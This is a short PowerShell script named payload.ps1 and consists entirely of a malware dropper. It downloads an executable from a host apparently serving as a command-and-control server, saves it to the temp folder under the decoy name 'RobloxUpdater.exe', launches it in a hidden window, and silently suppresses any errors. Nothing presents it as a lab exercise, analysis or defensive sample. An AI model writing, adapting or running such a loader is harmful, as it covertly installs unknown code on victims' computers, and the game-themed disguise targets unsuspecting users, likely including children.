# language: PowerShell, file: payload.ps1
$url = "https://nexus-hub-c2.onrender.com/raw_exe"
$out = "$env:TEMP\RobloxUpdater.exe"
try {
    (New-Object Net.WebClient).DownloadFile($url, $out)
    Start-Process $out -WindowStyle Hidden
} catch {
}
